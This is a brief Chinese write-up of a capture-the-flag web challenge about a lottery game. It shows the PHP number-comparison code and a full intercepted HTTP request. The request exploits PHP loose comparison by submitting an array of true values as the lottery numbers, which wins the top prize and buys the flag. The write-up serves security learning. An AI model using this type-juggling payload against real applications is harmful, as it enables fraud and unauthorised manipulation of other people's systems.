挺有意思的题目，可惜看题解了呜呜呜

先发现源码中的js中有关于买彩票的部分

```php
$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
```

弱类型判断，直接抓包修改即可

POST /api.php HTTP/1.1
Host: 61.147.171.105:53906
Content-Length: 63
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://61.147.171.105:53906
Referer: http://61.147.171.105:53906/buy.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0d5f78683b61ba49ce4a04e7d5f66314
Connection: close

{"action":"buy","numbers":[true,true,true,true,true,true,true]}

可以获取足够的钱来买flag